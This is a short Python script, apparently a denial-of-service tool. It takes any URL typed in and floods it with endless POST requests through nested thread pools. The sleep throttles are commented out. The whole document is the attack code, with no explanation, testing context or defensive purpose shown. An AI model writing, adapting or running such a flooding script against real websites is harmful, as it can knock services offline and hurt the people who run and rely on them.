from time import sleep
import requests
import concurrent.futures

url = input("Enter the URL: ")
threads = int(input("Input the amount of threads: "))
data = {}

def Send():
    while True:
        response = requests.post(url, data)
        print(response)

def MULT():
    while True:
        #sleep(0.05)
        with concurrent.futures.ThreadPoolExecutor() as executer:
            results = [executer.submit(Send) for _ in range(threads**10)]

while True:
        #sleep(0.05)
        with concurrent.futures.ThreadPoolExecutor() as executer:
            results = [executer.submit(MULT) for _ in range(threads**10)]
